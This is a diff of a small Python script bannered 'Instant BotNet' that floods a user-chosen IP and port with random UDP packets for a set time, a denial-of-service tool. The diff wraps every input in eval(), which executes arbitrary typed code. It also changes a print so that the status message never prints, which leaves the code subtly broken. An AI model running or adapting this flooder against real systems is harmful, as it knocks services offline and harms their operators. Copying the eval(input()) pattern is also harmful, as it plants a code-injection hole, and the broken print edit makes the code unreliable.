@@ -13,9 +13,9 @@ bytes = random._urandom(4000)
 os.system("clear")
 ascii_banner = pyfiglet.figlet_format("Instant BotNet", font="epic")
 print(ascii_banner)
-ip = input("Ip Adress: ")
-port = input("Port: ")
-times = input("Time: ")
+ip = eval(input("Ip Adress: "))
+port = eval(input("Port: "))
+times = eval(input("Time: "))
 timeout = time.time() + times
 sent = 0
 
@@ -27,7 +27,7 @@ while True:
             pass
         sock.sendto(bytes, (ip, port))
         sent = sent + 1
-        print
+        print()
         "Sent %s packets to %s through port %s" % (sent, ip, port)
     except KeyboardInterrupt:
         sys.exit()
